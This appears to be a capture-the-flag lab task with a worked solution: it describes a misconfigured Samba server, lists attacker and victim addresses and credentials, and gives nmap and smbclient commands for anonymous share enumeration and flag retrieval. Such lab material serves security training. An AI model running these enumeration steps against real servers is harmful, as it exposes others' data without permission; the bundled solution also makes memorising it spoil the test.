# samba-anonymous-share-infiltration

## Description
A corporate file server running Samba has been misconfigured, allowing anonymous access to sensitive shares. Your mission is to identify the vulnerable SMB service, enumerate available shares, and retrieve the confidential flag from the exposed directory.

## Scenario
During a penetration test of TechCorp's internal network, you've discovered a Linux file server running Samba. The system administrator has misconfigured the service, potentially exposing sensitive corporate data through anonymous share access. Your task is to exploit this misconfiguration and retrieve the hidden flag.

## Difficulty
medium

## Machines
- **attacker** (attacker): 172.23.145.3 - ssh
- **victim** (victim): 172.23.145.173 - samba, ssh
## Victim credentials
- **victim**: `runner` / `ctf2024`

## Hints
1. Start by scanning the network to identify open SMB ports on the target system
2. Use SMB enumeration tools to list available shares without authentication
3. Look for shares that allow guest or anonymous access to sensitive directories

## Flag Format
CTF{...}

## Solution (Samba)

1. **Scan the victim** for SMB ports: `nmap -p 139,445 --open <victim_ip>`. (Port 139 = NetBIOS, 445 = SMB; both are normal for Samba.)
2. **List shares** (no password): `smbclient -L //<victim_ip> -N`. If you see "Protocol negotiation... SMB1" or "Unable to connect with SMB1", ignore it—the share list still succeeded. To avoid the message, use: `smbclient -L //<victim_ip> -N --option='client min protocol=SMB2'`.
3. **Connect to the share**: `smbclient //<victim_ip>/share -N`.
4. **List and get the flag**: `ls`, then `get flag.txt`, then `cat flag.txt` (or open it locally).

